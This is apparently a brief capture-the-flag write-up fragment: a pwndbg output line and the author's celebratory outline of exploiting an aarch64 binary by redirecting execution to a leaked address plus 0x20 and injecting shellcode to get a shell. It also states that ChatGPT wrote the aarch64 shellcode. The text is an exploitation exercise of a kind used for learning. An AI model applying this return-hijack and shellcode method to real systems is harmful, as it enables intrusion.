────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
Remote connection closed
pwndbg> 

```
 YES!!!!!!!! I GOT THE SHELL LOCALLY



 1. chatgpt to setup aarch64 environment
 2. b"UwU\x00\x00\x00\x00\x00" to reserve UwU[8]
 3. a bit of testing in pwndbg got me to find out that main would somehow return to `leaked address + 0x20`
 4. shellcode injection at `leaked address + 0x20` (put b'/bin/sh' somewhere else) Shellcode probably has to be written in aarch64 as well soo i leave this part to chatgpt as well 
 5. i am literally a prompt god